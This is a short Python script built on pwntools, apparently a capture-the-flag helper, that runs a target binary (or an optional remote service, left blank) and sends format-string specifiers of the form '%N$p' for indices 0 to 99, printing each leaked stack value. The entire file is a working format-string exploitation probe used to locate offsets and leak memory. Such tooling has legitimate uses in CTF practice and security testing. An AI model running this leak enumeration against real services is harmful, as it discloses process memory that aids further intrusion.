from pwn import *

elf = context.binary = ELF("",checksec=False)

for i in range(100):
	try:
		p = process(level='error')
		#p = remote("",)
		p.sendline('%{}$p'.format(i).encode())
		result = p.recvline().decode()

		if result:
			print(str(i) + ': ' + str(result).strip())
	except EOFError:
		pass	